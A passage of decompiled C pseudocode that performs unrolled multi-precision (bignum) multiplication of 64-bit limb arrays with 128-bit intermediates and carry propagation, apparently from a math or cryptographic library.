  *((_QWORD *)&v69 + 1) += v66 + (unsigned __int64)v69 < v66;
  v71 = *((_QWORD *)&v69 + 1) + v67;
  v72 = (v71 < *((_QWORD *)&v69 + 1)) + v68;
  v73 = a2[5] * (unsigned __int128)*a3;
  *(_QWORD *)&v73 = v70 + v73;
  a1[5] = v73;
  *((_QWORD *)&v73 + 1) += (unsigned __int64)v73 < v70;
  v74 = *((_QWORD *)&v73 + 1) + v71;
  v75 = (v74 < *((_QWORD *)&v73 + 1)) + v72;
  v76 = *a2 * (unsigned __int128)a3[6];
  v77 = v74 + v76;
  *((_QWORD *)&v76 + 1) += v74 + (unsigned __int64)v76 < v74;
  v78 = *((_QWORD *)&v76 + 1) + v75;
  v79 = v78 < *((_QWORD *)&v76 + 1);
  v80 = a2[1] * (unsigned __int128)a3[5];
  v81 = v77 + v80;
  *((_QWORD *)&v80 + 1) += v77 + (unsigned __int64)v80 < v77;
  v82 = *((_QWORD *)&v80 + 1) + v78;
  v83 = (v82 < *((_QWORD *)&v80 + 1)) + v79;
  v84 = a2[2] * (unsigned __int128)a3[4];
  v85 = v81 + v84;
  *((_QWORD *)&v84 + 1) += v81 + (unsigned __int64)v84 < v81;
  v86 = *((_QWORD *)&v84 + 1) + v82;
  v87 = (v86 < *((_QWORD *)&v84 + 1)) + v83;
  v88 = a2[3] * (unsigned __int128)a3[3];
  v89 = v85 + v88;
  *((_QWORD *)&v88 + 1) += v85 + (unsigned __int64)v88 < v85;
  v90 = *((_QWORD *)&v88 + 1) + v86;
  v91 = (v90 < *((_QWORD *)&v88 + 1)) + v87;
  v92 = a2[4] * (unsigned __int128)a3[2];
  v93 = v89 + v92;
  *((_QWORD *)&v92 + 1) += v89 + (unsigned __int64)v92 < v89;
  v94 = *((_QWORD *)&v92 + 1) + v90;
  v95 = (v94 < *((_QWORD *)&v92 + 1)) + v91;
  v96 = a2[5] * (unsigned __int128)a3[1];
  v97 = v93 + v96;
  *((_QWORD *)&v96 + 1) += v93 + (unsigned __int64)v96 < v93;
  v98 = *((_QWORD *)&v96 + 1) + v94;
  v99 = (v98 < *((_QWORD *)&v96 + 1)) + v95;
  v100 = a2[6] * (unsigned __int128)*a3;
  *(_QWORD *)&v100 = v97 + v100;
  a1[6] = v100;
  *((_QWORD *)&v100 + 1) += (unsigned __int64)v100 < v97;
  v101 = *((_QWORD *)&v100 + 1) + v98;
  v102 = (v101 < *((_QWORD *)&v100 + 1)) + v99;
  v103 = *a2 * (unsigned __int128)a3[7];
  v104 = v101 + v103;
  *((_QWORD *)&v103 + 1) += v101 + (unsigned __int64)v103 < v101;
  v105 = *((_QWORD *)&v103 + 1) + v102;
  v106 = v105 < *((_QWORD *)&v103 + 1);
  v107 = a2[1] * (unsigned __int128)a3[6];
  v108 = v104 + v107;
  *((_QWORD *)&v107 + 1) += v104 + (unsigned __int64)v107 < v104;
  v109 = *((_QWORD *)&v107 + 1) + v105;
  v110 = (v109 < *((_QWORD *)&v107 + 1)) + v106;
  v111 = a2[2] * (unsigned __int128)a3[5];
  v112 = v108 + v111;
  *((_QWORD *)&v111 + 1) += v108 + (unsigned __int64)v111 < v108;
  v113 = *((_QWORD *)&v111 + 1) + v109;
  v114 = (v113 < *((_QWORD *)&v111 + 1)) + v110;
  v115 = a2[3] * (unsigned __int128)a3[4];
  v116 = v112 + v115;
  *((_QWORD *)&v115 + 1) += v112 + (unsigned __int64)v115 < v112;
  v117 = *((_QWORD *)&v115 + 1) + v113;
  v118 = (v117 < *((_QWORD *)&v115 + 1)) + v114;
  v119 = a2[4] * (unsigned __int128)a3[3];
  v120 = v116 + v119;
  *((_QWORD *)&v119 + 1) += v116 + (unsigned __int64)v119 < v116;
  v121 = *((_QWORD *)&v119 + 1) + v117;
  v122 = (v121 < *((_QWORD *)&v119 + 1)) + v118;
  v123 = a2[5] * (unsigned __int128)a3[2];
  v124 = v120 + v123;
  *((_QWORD *)&v123 + 1) += v120 + (unsigned __int64)v123 < v120;
  v125 = *((_QWORD *)&v123 + 1) + v121;
  v126 = (v125 < *((_QWORD *)&v123 + 1)) + v122;
  v127 = a2[6] * (unsigned __int128)a3[1];
  v128 = v124 + v127;
  *((_QWORD *)&v127 + 1) += v124 + (unsigned __int64)v127 < v124;
  v129 = *((_QWORD *)&v127 + 1) + v125;
  v130 = (v129 < *((_QWORD *)&v127 + 1)) + v126;
  v131 = a2[7] * (unsigned __int128)*a3;
  *(_QWORD *)&v131 = v128 + v131;
  a1[7] = v131;
  *((_QWORD *)&v131 + 1) += (unsigned __int64)v131 < v128;
  v132 = *((_QWORD *)&v131 + 1) + v129;
  v133 = (v132 < *((_QWORD *)&v131 + 1)) + v130;
  v134 = *a2 * (unsigned __int128)a3[8];
  v135 = v132 + v134;
  *((_QWORD *)&v134 + 1) += v132 + (unsigned __int64)v134 < v132;
  v136 = *((_QWORD *)&v134 + 1) + v133;
  v137 = v136 < *((_QWORD *)&v134 + 1);
  v138 = a2[1] * (unsigned __int128)a3[7];
  v139 = v135 + v138;
  *((_QWORD *)&v138 + 1) += v135 + (unsigned __int64)v138 < v135;
  v140 = *((_QWORD *)&v138 + 1) + v136;
  v141 = (v140 < *((_QWORD *)&v138 + 1)) + v137;
  v142 = a2[2] * (unsigned __int128)a3[6];
  v143 = v139 + v142;
  *((_QWORD *)&v142 + 1) += v139 + (unsigned __int64)v142 < v139;
  v144 = *((_QWORD *)&v142 + 1) + v140;
  v145 = (v144 < *((_QWORD *)&v142 + 1)) + v141;
  v146 = a2[3] * (unsigned __int128)a3[5];
  v147 = v143 + v146;
  *((_QWORD *)&v146 + 1) += v143 + (unsigned __int64)v146 < v143;
  v148 = *((_QWORD *)&v146 + 1) + v144;
  v149 = (v148 < *((_QWORD *)&v146 + 1)) + v145;
  v150 = a2[4] * (unsigned __int128)a3[4];
  v151 = v147 + v150;
  *((_QWORD *)&v150 + 1) += v147 + (unsigned __int64)v150 < v147;
  v152 = *((_QWORD *)&v150 + 1) + v148;
  v153 = (v152 < *((_QWORD *)&v150 + 1)) + v149;
  v154 = a2[5] * (unsigned __int128)a3[3];
  v155 = v151 + v154;
  *((_QWORD *)&v154 + 1) += v151 + (unsigned __int64)v154 < v151;
  v156 = *((_QWORD *)&v154 + 1) + v152;
  v157 = (v156 < *((_QWORD *)&v154 + 1)) + v153;
  v158 = a2[6] * (unsigned __int128)a3[2];
  v159 = v155 + v158;
  *((_QWORD *)&v158 + 1) += v155 + (unsigned __int64)v158 < v155;
  v160 = *((_QWORD *)&v158 + 1) + v156;
  v161 = (v160 < *((_QWORD *)&v158 + 1)) + v157;
  v162 = a2[7] * (unsigned __int128)a3[1];
  v163 = v159 + v162;
  *((_QWORD *)&v162 + 1) += v159 + (unsigned __int64)v162 < v159;
  v164 = *((_QWORD *)&v162 + 1) + v160;
  v165 = (v164 < *((_QWORD *)&v162 + 1)) + v161;
  v166 = a2[8] * (unsigned __int128)*a3;
  *(_QWORD *)&v166 = v163 + v166;
  a1[8] = v166;
  *((_QWORD *)&v166 + 1) += (unsigned __int64)v166 < v163;
  v167 = *((_QWORD *)&v166 + 1) + v164;
  v168 = (v167 < *((_QWORD *)&v166 + 1)) + v165;
  v169 = *a2 * (unsigned __int128)a3[9];
  v170 = v167 + v169;
  *((_QWORD *)&v169 + 1) += v167 + (unsigned __int64)v169 < v167;
  v171 = *((_QWORD *)&v169 + 1) + v168;
  v172 = v171 < *((_QWORD *)&v169 + 1);
  v173 = a2[1] * (unsigned __int128)a3[8];
  v174 = v170 + v173;
  *((_QWORD *)&v173 + 1) += v170 + (unsigned __int64)v173 < v170;
  v175 = *((_QWORD *)&v173 + 1) + v171;
  v176 = (v175 < *((_QWORD *)&v173 + 1)) + v172;
  v177 = a2[2] * (unsigned __int128)a3[7];
  v178 = v174 + v177;
  *((_QWORD *)&v177 + 1) += v174 + (unsigned __int64)v177 < v174;
  v179 = *((_QWORD *)&v177 + 1) + v175;
  v180 = (v179 < *((_QWORD *)&v177 + 1)) + v176;
  v181 = a2[3] * (unsigned __int128)a3[6];
  v182 = v178 + v181;
  *((_QWORD *)&v181 + 1) += v178 + (unsigned __int64)v181 < v178;
  v183 = *((_QWORD *)&v181 + 1) + v179;
  v184 = (v183 < *((_QWORD *)&v181 + 1)) + v180;
  v185 = a2[4] * (unsigned __int128)a3[5];
  v186 = v182 + v185;
  *((_QWORD *)&v185 + 1) += v182 + (unsigned __int64)v185 < v182;
  v187 = *((_QWORD *)&v185 + 1) + v183;
  v188 = (v187 < *((_QWORD *)&v185 + 1)) + v184;
  v189 = a2[5] * (unsigned __int128)a3[4];
  v190 = v186 + v189;
  *((_QWORD *)&v189 + 1) += v186 + (unsigned __int64)v189 < v186;
  v191 = *((_QWORD *)&v189 + 1) + v187;
  v192 = (v191 < *((_QWORD *)&v189 + 1)) + v188;
  v193 = a2[6] * (unsigned __int128)a3[3];
  v194 = v190 + v193;
  *((_QWORD *)&v193 + 1) += v190 + (unsigned __int64)v193 < v190;
  v195 = *((_QWORD *)&v193 + 1) + v191;
  v196 = (v195 < *((_QWORD *)&v193 + 1)) + v192;
  v197 = a2[7] * (unsigned __int128)a3[2];
  v198 = v194 + v197;
  *((_QWORD *)&v197 + 1) += v194 + (unsigned __int64)v197 < v194;
  v199 = *((_QWORD *)&v197 + 1) + v195;
  v200 = (v199 < *((_QWORD *)&v197 + 1)) + v196;
  v201 = a2[8] * (unsigned __int128)a3[1];
  v202 = v198 + v201;
  *((_QWORD *)&v201 + 1) += v198 + (unsigned __int64)v201 < v198;
  v203 = *((_QWORD *)&v201 + 1) + v199;
  v204 = (v203 < *((_QWORD *)&v201 + 1)) + v200;
  v205 = a2[9] * (unsigned __int128)*a3;
  *(_QWORD *)&v205 = v202 + v205;
  a1[9] = v205;
  *((_QWORD *)&v205 + 1) += (unsigned __int64)v205 < v202;
  v206 = *((_QWORD *)&v205 + 1) + v203;
  v207 = (v206 < *((_QWORD *)&v205 + 1)) + v204;
  v208 = *a2 * (unsigned __int128)a3[10];
  v209 = v206 + v208;
  *((_QWORD *)&v208 + 1) += v206 + (unsigned __int64)v208 < v206;
  v210 = *((_QWORD *)&v208 + 1) + v207;
  v211 = v210 < *((_QWORD *)&v208 + 1);
  v212 = a2[1] * (unsigned __int128)a3[9];
  v213 = v209 + v212;
  *((_QWORD *)&v212 + 1) += v209 + (unsigned __int64)v212 < v209;
  v214 = *((_QWORD *)&v212 + 1) + v210;
  v215 = (v214 < *((_QWORD *)&v212 + 1)) + v211;
  v216 = a2[2] * (unsigned __int128)a3[8];
  v217 = v213 + v216;
  *((_QWORD *)&v216 + 1) += v213 + (unsigned __int64)v216 < v213;
  v218 = *((_QWORD *)&v216 + 1) + v214;
  v219 = (v218 < *((_QWORD *)&v216 + 1)) + v215;
  v220 = a2[3] * (unsigned __int128)a3[7];
  v221 = v217 + v220;
  *((_QWORD *)&v220 + 1) += v217 + (unsigned __int64)v220 < v217;
  v222 = *((_QWORD *)&v220 + 1) + v218;
  v223 = (v222 < *((_QWORD *)&v220 + 1)) + v219;
  v224 = a2[4] * (unsigned __int128)a3[6];
  v225 = v221 + v224;
  *((_QWORD *)&v224 + 1) += v221 + (unsigned __int64)v224 < v221;
  v226 = *((_QWORD *)&v224 + 1) + v222;
  v227 = (v226 < *((_QWORD *)&v224 + 1)) + v223;
  v228 = a2[5] * (unsigned __int128)a3[5];
  v229 = v225 + v228;
  *((_QWORD *)&v228 + 1) += v225 + (unsigned __int64)v228 < v225;
  v230 = *((_QWORD *)&v228 + 1) + v226;
  v231 = (v230 < *((_QWORD *)&v228 + 1)) + v227;
  v232 = a2[6] * (unsigned __int128)a3[4];
  v233 = v229 + v232;
  *((_QWORD *)&v232 + 1) += v229 + (unsigned __int64)v232 < v229;
  v234 = *((_QWORD *)&v232 + 1) + v230;
  v235 = (v234 < *((_QWORD *)&v232 + 1)) + v231;
  v236 = a2[7] * (unsigned __int128)a3[3];
  v237 = v233 + v236;
  *((_QWORD *)&v236 + 1) += v233 + (unsigned __int64)v236 < v233;
  v238 = *((_QWORD *)&v236 + 1) + v234;
  v239 = (v238 < *((_QWORD *)&v236 + 1)) + v235;
  v240 = a2[8] * (unsigned __int128)a3[2];
  v241 = v237 + v240;
  *((_QWORD *)&v240 + 1) += v237 + (unsigned __int64)v240 < v237;
  v242 = *((_QWORD *)&v240 + 1) + v238;
  v243 = (v242 < *((_QWORD *)&v240 + 1)) + v239;
  v244 = a2[9] * (unsigned __int128)a3[1];
  v245 = v241 + v244;
  *((_QWORD *)&v244 + 1) += v241 + (unsigned __int64)v244 < v241;
  v246 = *((_QWORD *)&v244 + 1) + v242;
  v247 = (v246 < *((_QWORD *)&v244 + 1)) + v243;
  v248 = a2[10] * (unsigned __int128)*a3;
  *(_QWORD *)&v248 = v245 + v248;
  a1[10] = v248;
  *((_QWORD *)&v248 + 1) += (unsigned __int64)v248 < v245;
  v249 = *((_QWORD *)&v248 + 1) + v246;
  v250 = (v249 < *((_QWORD *)&v248 + 1)) + v247;
  v251 = *a2 * (unsigned __int128)a3[11];
  v252 = v249 + v251;
  *((_QWORD *)&v251 + 1) += v249 + (unsigned __int64)v251 < v249;
  v253 = *((_QWORD *)&v251 + 1) + v250;
  v254 = v253 < *((_QWORD *)&v251 + 1);
  v255 = a2[1] * (unsigned __int128)a3[10];
  v256 = v252 + v255;
  *((_QWORD *)&v255 + 1) += v252 + (unsigned __int64)v255 < v252;
  v257 = *((_QWORD *)&v255 + 1) + v253;
  v258 = (v257 < *((_QWORD *)&v255 + 1)) + v254;
  v259 = a2[2] * (unsigned __int128)a3[9];
  v260 = v256 + v259;
  *((_QWORD *)&v259 + 1) += v256 + (unsigned __int64)v259 < v256;
  v261 = *((_QWORD *)&v259 + 1) + v257;
  v262 = (v261 < *((_QWORD *)&v259 + 1)) + v258;
  v263 = a2[3] * (unsigned __int128)a3[8];
  v264 = v260 + v263;
  *((_QWORD *)&v263 + 1) += v260 + (unsigned __int64)v263 < v260;
  v265 = *((_QWORD *)&v263 + 1) + v261;
  v266 = (v265 < *((_QWORD *)&v263 + 1)) + v262;
  v267 = a2[4] * (unsigned __int128)a3[7];
  v268 = v264 + v267;
  *((_QWORD *)&v267 + 1) += v264 + (unsigned __int64)v267 < v264;
  v269 = *((_QWORD *)&v267 + 1) + v265;
  v270 = (v269 < *((_QWORD *)&v267 + 1)) + v266;
  v271 = a2[5] * (unsigned __int128)a3[6];
  v272 = v268 + v271;
  *((_QWORD *)&v271 + 1) += v268 + (unsigned __int64)v271 < v268;
  v273 = *((_QWORD *)&v271 + 1) + v269;
  v274 = (v273 < *((_QWORD *)&v271 + 1)) + v270;
  v275 = a2[6] * (unsigned __int128)a3[5];
  v276 = v272 + v275;
  *((_QWORD *)&v275 + 1) += v272 + (unsigned __int64)v275 < v272;
  v277 = *((_QWORD *)&v275 + 1) + v273;
  v278 = (v277 < *((_QWORD *)&v275 + 1)) + v274;
  v279 = a2[7] * (unsigned __int128)a3[4];
  v280 = v276 + v279;
  *((_QWORD *)&v279 + 1) += v276 + (unsigned __int64)v279 < v276;
  v281 = *((_QWORD *)&v279 + 1) + v277;
  v282 = (v281 < *((_QWORD *)&v279 + 1)) + v278;
  v283 = a2[8] * (unsigned __int128)a3[3];
  v284 = v280 + v283;
  *((_QWORD *)&v283 + 1) += v280 + (unsigned __int64)v283 < v280;
  v285 = *((_QWORD *)&v283 + 1) + v281;
  v286 = (v285 < *((_QWORD *)&v283 + 1)) + v282;
  v287 = a2[9] * (unsigned __int128)a3[2];
  v288 = v284 + v287;
  *((_QWORD *)&v287 + 1) += v284 + (unsigned __int64)v287 < v284;
  v289 = *((_QWORD *)&v287 + 1) + v285;
  v290 = (v289 < *((_QWORD *)&v287 + 1)) + v286;
  v291 = a2[10] * (unsigned __int128)a3[1];
  v292 = v288 + v291;
  *((_QWORD *)&v291 + 1) += v288 + (unsigned __int64)v291 < v288;
  v293 = *((_QWORD *)&v291 + 1) + v289;
  v294 = (v293 < *((_QWORD *)&v291 + 1)) + v290;
  v295 = a2[11] * (unsigned __int128)*a3;
  *(_QWORD *)&v295 = v292 + v295;
  *((_QWORD *)&v295 + 1) += (unsigned __int64)v295 < v292;
  v296 = *((_QWORD *)&v295 + 1) + v293;
  a1[11] = v295;
  v297 = (v296 < *((_QWORD *)&v295 + 1)) + v294;
  v298 = *a2 * (unsigned __int128)a3[12];
  v299 = v296 + v298;
  *((_QWORD *)&v298 + 1) += v296 + (unsigned __int64)v298 < v296;
  v300 = *((_QWORD *)&v298 + 1) + v297;
  v301 = v300 < *((_QWORD *)&v298 + 1);
  v302 = a2[1] * (unsigned __int128)a3[11];
  v303 = v299 + v302;
  *((_QWORD *)&v302 + 1) += v299 + (unsigned __int64)v302 < v299;
  v304 = *((_QWORD *)&v302 + 1) + v300;
  v305 = (v304 < *((_QWORD *)&v302 + 1)) + v301;
  v306 = a2[2] * (unsigned __int128)a3[10];
  v307 = v303 + v306;
  *((_QWORD *)&v306 + 1) += v303 + (unsigned __int64)v306 < v303;
  v308 = *((_QWORD *)&v306 + 1) + v304;
  v309 = (v308 < *((_QWORD *)&v306 + 1)) + v305;
  v310 = a2[3] * (unsigned __int128)a3[9];
  v311 = v307 + v310;
  *((_QWORD *)&v310 + 1) += v307 + (unsigned __int64)v310 < v307;
  v312 = *((_QWORD *)&v310 + 1) + v308;
  v313 = (v312 < *((_QWORD *)&v310 + 1)) + v309;
  v314 = a2[4] * (unsigned __int128)a3[8];
  v315 = v311 + v314;
  *((_QWORD *)&v314 + 1) += v311 + (unsigned __int64)v314 < v311;
  v316 = *((_QWORD *)&v314 + 1) + v312;
  v317 = (v316 < *((_QWORD *)&v314 + 1)) + v313;
  v318 = a2[5] * (unsigned __int128)a3[7];
  v319 = v315 + v318;
  *((_QWORD *)&v318 + 1) += v315 + (unsigned __int64)v318 < v315;
  v320 = *((_QWORD *)&v318 + 1) + v316;
  v321 = (v320 < *((_QWORD *)&v318 + 1)) + v317;
  v322 = a2[6] * (unsigned __int128)a3[6];
  v323 = v319 + v322;
  *((_QWORD *)&v322 + 1) += v319 + (unsigned __int64)v322 < v319;
  v324 = *((_QWORD *)&v322 + 1) + v320;
  v325 = (v324 < *((_QWORD *)&v322 + 1)) + v321;
  v326 = a2[7] * (unsigned __int128)a3[5];
  v327 = v323 + v326;
  *((_QWORD *)&v326 + 1) += v323 + (unsigned __int64)v326 < v323;
  v328 = *((_QWORD *)&v326 + 1) + v324;
  v329 = (v328 < *((_QWORD *)&v326 + 1)) + v325;
  v330 = a2[8] * (unsigned __int128)a3[4];
  v331 = v327 + v330;
  *((_QWORD *)&v330 + 1) += v327 + (unsigned __int64)v330 < v327;
  v332 = *((_QWORD *)&v330 + 1) + v328;
  v333 = (v332 < *((_QWORD *)&v330 + 1)) + v329;
  v334 = a2[9] * (unsigned __int128)a3[3];
  v335 = v331 + v334;
  *((_QWORD *)&v334 + 1) += v331 + (unsigned __int64)v334 < v331;
  v336 = *((_QWORD *)&v334 + 1) + v332;
  v337 = (v336 < *((_QWORD *)&v334 + 1)) + v333;
  v338 = a2[10] * (unsigned __int128)a3[2];
  v339 = v335 + v338;
  *((_QWORD *)&v338 + 1) += v335 + (unsigned __int64)v338 < v335;
  v340 = *((_QWORD *)&v338 + 1) + v336;
  v341 = (v340 < *((_QWORD *)&v338 + 1)) + v337;
  v342 = a2[11] * (unsigned __int128)a3[1];
  v343 = v339 + v342;
  *((_QWORD *)&v342 + 1) += v339 + (unsigned __int64)v342 < v339;
  v344 = *((_QWORD *)&v342 + 1) + v340;
  v345 = (v344 < *((_QWORD *)&v342 + 1)) + v341;
  v346 = a2[12] * (unsigned __int128)*a3;
  *(_QWORD *)&v346 = v343 + v346;
  a1[12] = v346;
  *((_QWORD *)&v346 + 1) += (unsigned __int64)v346 < v343;
  v347 = *((_QWORD *)&v346 + 1) + v344;
  v348 = (v347 < *((_QWORD *)&v346 + 1)) + v345;
  v349 = *a2 * (unsigned __int128)a3[13];
  v350 = v347 + v349;
  *((_QWORD *)&v349 + 1) += v347 + (unsigned __int64)v349 < v347;
  v351 = *((_QWORD *)&v349 + 1) + v348;
  v352 = v351 < *((_QWORD *)&v349 + 1);
  v353 = a2[1] * (unsigned __int128)a3[12];
  v354 = v350 + v353;
  *((_QWORD *)&v353 + 1) += v350 + (unsigned __int64)v353 < v350;
  v355 = *((_QWORD *)&v353 + 1) + v351;
  v356 = (v355 < *((_QWORD *)&v353 + 1)) + v352;
  v357 = a2[2] * (unsigned __int128)a3[11];
  v358 = v354 + v357;
  *((_QWORD *)&v357 + 1) += v354 + (unsigned __int64)v357 < v354;
  v359 = *((_QWORD *)&v357 + 1) + v355;
  v360 = (v359 < *((_QWORD *)&v357 + 1)) + v356;
  v361 = a2[3] * (unsigned __int128)a3[10];
  v362 = v358 + v361;
  *((_QWORD *)&v361 + 1) += v358 + (unsigned __int64)v361 < v358;
  v363 = *((_QWORD *)&v361 + 1) + v359;
  v364 = (v363 < *((_QWORD *)&v361 + 1)) + v360;
  v365 = a2[4] * (unsigned __int128)a3[9];
  v366 = v362 + v365;
  *((_QWORD *)&v365 + 1) += v362 + (unsigned __int64)v365 < v362;
  v367 = *((_QWORD *)&v365 + 1) + v363;
  v368 = (v367 < *((_QWORD *)&v365 + 1)) + v364;
  v369 = a2[5] * (unsigned __int128)a3[8];
  v370 = v366 + v369;
  *((_QWORD *)&v369 + 1) += v366 + (unsigned __int64)v369 < v366;
  v371 = *((_QWORD *)&v369 + 1) + v367;
  v372 = (v371 < *((_QWORD *)&v369 + 1)) + v368;
  v373 = a2[6] * (unsigned __int128)a3[7];
  v374 = v370 + v373;
  *((_QWORD *)&v373 + 1) += v370 + (unsigned __int64)v373 < v370;
  v375 = *((_QWORD *)&v373 + 1) + v371;
  v376 = (v375 < *((_QWORD *)&v373 + 1)) + v372;
  v377 = a2[7] * (unsigned __int128)a3[6];
  v378 = v374 + v377;
  *((_QWORD *)&v377 + 1) += v374 + (unsigned __int64)v377 < v374;
  v379 = *((_QWORD *)&v377 + 1) + v375;
  v380 = (v379 < *((_QWORD *)&v377 + 1)) + v376;
  v381 = a2[8] * (unsigned __int128)a3[5];
  v382 = v378 + v381;
  *((_QWORD *)&v381 + 1) += v378 + (unsigned __int64)v381 < v378;
  v383 = *((_QWORD *)&v381 + 1) + v379;
  v384 = (v383 < *((_QWORD *)&v381 + 1)) + v380;
  v385 = a2[9] * (unsigned __int128)a3[4];
  v386 = v382 + v385;
  *((_QWORD *)&v385 + 1) += v382 + (unsigned __int64)v385 < v382;
  v387 = *((_QWORD *)&v385 + 1) + v383;
  v388 = (v387 < *((_QWORD *)&v385 + 1)) + v384;
  v389 = a2[10] * (unsigned __int128)a3[3];
  v390 = v386 + v389;
  *((_QWORD *)&v389 + 1) += v386 + (unsigned __int64)v389 < v386;
  v391 = *((_QWORD *)&v389 + 1) + v387;
  v392 = (v391 < *((_QWORD *)&v389 + 1)) + v388;
  v393 = a2[11] * (unsigned __int128)a3[2];
  v394 = v390 + v393;
  *((_QWORD *)&v393 + 1) += v390 + (unsigned __int64)v393 < v390;
  v395 = *((_QWORD *)&v393 + 1) + v391;
  v396 = (v395 < *((_QWORD *)&v393 + 1)) + v392;
  v397 = a2[12] * (unsigned __int128)a3[1];
  v398 = v394 + v397;
  *((_QWORD *)&v397 + 1) += v394 + (unsigned __int64)v397 < v394;
  v399 = *((_QWORD *)&v397 + 1) + v395;
  v400 = (v399 < *((_QWORD *)&v397 + 1)) + v396;
  v401 = a2[13] * (unsigned __int128)*a3;
  *(_QWORD *)&v401 = v398 + v401;
  a1[13] = v401;
  *((_QWORD *)&v401 + 1) += (unsigned __int64)v401 < v398;
  v402 = *((_QWORD *)&v401 + 1) + v399;
  v403 = (v402 < *((_QWORD *)&v401 + 1)) + v400;
  v404 = *a2 * (unsigned __int128)a3[14];
  v405 = v402 + v404;
  *((_QWORD *)&v404 + 1) += v402 + (unsigned __int64)v404 < v402;
  v406 = *((_QWORD *)&v404 + 1) + v403;
  v407 = v406 < *((_QWORD *)&v404 + 1);
  v408 = a2[1] * (unsigned __int128)a3[13];
  v409 = v405 + v408;
  *((_QWORD *)&v408 + 1) += v405 + (unsigned __int64)v408 < v405;
  v410 = *((_QWORD *)&v408 + 1) + v406;
  v411 = (v410 < *((_QWORD *)&v408 + 1)) + v407;
  v412 = a2[2] * (unsigned __int128)a3[12];
  v413 = v409 + v412;
  *((_QWORD *)&v412 + 1) += v409 + (unsigned __int64)v412 < v409;
  v414 = *((_QWORD *)&v412 + 1) + v410;
  v415 = (v414 < *((_QWORD *)&v412 + 1)) + v411;
  v416 = a2[3] * (unsigned __int128)a3[11];
  v417 = v413 + v416;
  *((_QWORD *)&v416 + 1) += v413 + (unsigned __int64)v416 < v413;
  v418 = *((_QWORD *)&v416 + 1) + v414;
  v419 = (v418 < *((_QWORD *)&v416 + 1)) + v415;
  v420 = a2[4] * (unsigned __int128)a3[10];
  v421 = v417 + v420;
  *((_QWORD *)&v420 + 1) += v417 + (unsigned __int64)v420 < v417;
  v422 = *((_QWORD *)&v420 + 1) + v418;
  v423 = (v422 < *((_QWORD *)&v420 + 1)) + v419;
  v424 = a2[5] * (unsigned __int128)a3[9];
  v425 = v421 + v424;
  *((_QWORD *)&v424 + 1) += v421 + (unsigned __int64)v424 < v421;
  v426 = *((_QWORD *)&v424 + 1) + v422;
  v427 = (v426 < *((_QWORD *)&v424 + 1)) + v423;
  v428 = a2[6] * (unsigned __int128)a3[8];
  v429 = v425 + v428;
  *((_QWORD *)&v428 + 1) += v425 + (unsigned __int64)v428 < v425;
  v430 = *((_QWORD *)&v428 + 1) + v426;
  v431 = (v430 < *((_QWORD *)&v428 + 1)) + v427;
  v432 = a2[7] * (unsigned __int128)a3[7];
  v433 = v429 + v432;
  *((_QWORD *)&v432 + 1) += v429 + (unsigned __int64)v432 < v429;
  v434 = *((_QWORD *)&v432 + 1) + v430;
  v435 = (v434 < *((_QWORD *)&v432 + 1)) + v431;
  v436 = a2[8] * (unsigned __int128)a3[6];
  v437 = v433 + v436;
  *((_QWORD *)&v436 + 1) += v433 + (unsigned __int64)v436 < v433;
  v438 = *((_QWORD *)&v436 + 1) + v434;
  v439 = (v438 < *((_QWORD *)&v436 + 1)) + v435;
  v440 = a2[9] * (unsigned __int128)a3[5];
  v441 = v437 + v440;
  *((_QWORD *)&v440 + 1) += v437 + (unsigned __int64)v440 < v437;
  v442 = *((_QWORD *)&v440 + 1) + v438;
  v443 = (v442 < *((_QWORD *)&v440 + 1)) + v439;
  v444 = a2[10] * (unsigned __int128)a3[4];
  v445 = v441 + v444;
  *((_QWORD *)&v444 + 1) += v441 + (unsigned __int64)v444 < v441;
  v446 = *((_QWORD *)&v444 + 1) + v442;
  v447 = (v446 < *((_QWORD *)&v444 + 1)) + v443;
  v448 = a2[11] * (unsigned __int128)a3[3];
  v449 = v445 + v448;
  *((_QWORD *)&v448 + 1) += v445 + (unsigned __int64)v448 < v445;
  v450 = *((_QWORD *)&v448 + 1) + v446;
  v451 = (v450 < *((_QWORD *)&v448 + 1)) + v447;
  v452 = a2[12] * (unsigned __int128)a3[2];
  v453 = v449 + v452;
  *((_QWORD *)&v452 + 1) += v449 + (unsigned __int64)v452 < v449;
  v454 = *((_QWORD *)&v452 + 1) + v450;
  v455 = (v454 < *((_QWORD *)&v452 + 1)) + v451;
  v456 = a2[13] * (unsigned __int128)a3[1];
  v457 = v453 + v456;
  *((_QWORD *)&v456 + 1) += v453 + (unsigned __int64)v456 < v453;
  v458 = *((_QWORD *)&v456 + 1) + v454;
  v459 = (v458 < *((_QWORD *)&v456 + 1)) + v455;
  v460 = a2[14] * (unsigned __int128)*a3;
  *(_QWORD *)&v460 = v457 + v460;
  a1[14] = v460;
  *((_QWORD *)&v460 + 1) += (unsigned __int64)v460 < v457;
  v461 = *((_QWORD *)&v460 + 1) + v458;
  v462 = (v461 < *((_QWORD *)&v460 + 1)) + v459;
  v463 = *a2 * (unsigned __int128)a3[15];
  v464 = v461 + v463;
  *((_QWORD *)&v463 + 1) += v461 + (unsigned __int64)v463 < v461;
  v465 = *((_QWORD *)&v463 + 1) + v462;
  v466 = v465 < *((_QWORD *)&v463 + 1);
  v467 = a2[1] * (unsigned __int128)a3[14];
  v468 = v464 + v467;
  *((_QWORD *)&v467 + 1) += v464 + (unsigned __int64)v467 < v464;
  v469 = *((_QWORD *)&v467 + 1) + v465;
  v470 = (v469 < *((_QWORD *)&v467 + 1)) + v466;
  v471 = a2[2] * (unsigned __int128)a3[13];
  v472 = v468 + v471;
  *((_QWORD *)&v471 + 1) += v468 + (unsigned __int64)v471 < v468;
  v473 = *((_QWORD *)&v471 + 1) + v469;
  v474 = (v473 < *((_QWORD *)&v471 + 1)) + v470;
  v475 = a2[3] * (unsigned __int128)a3[12];
  v476 = v472 + v475;
  *((_QWORD *)&v475 + 1) += v472 + (unsigned __int64)v475 < v472;
  v477 = *((_QWORD *)&v475 + 1) + v473;
  v478 = (v477 < *((_QWORD *)&v475 + 1)) + v474;
  v479 = a2[4] * (unsigned __int128)a3[11];
  v480 = v476 + v479;
  *((_QWORD *)&v479 + 1) += v476 + (unsigned __int64)v479 < v476;
  v481 = *((_QWORD *)&v479 + 1) + v477;
  v482 = (v481 < *((_QWORD *)&v479 + 1)) + v478;
  v483 = a2[5] * (unsigned __int128)a3[10];
  v484 = v480 + v483;
  *((_QWORD *)&v483 + 1) += v480 + (unsigned __int64)v483 < v480;
  v485 = *((_QWORD *)&v483 + 1) + v481;
  v486 = (v485 < *((_QWORD *)&v483 + 1)) + v482;
  v487 = a2[6] * (unsigned __int128)a3[9];
  v488 = v484 + v487;
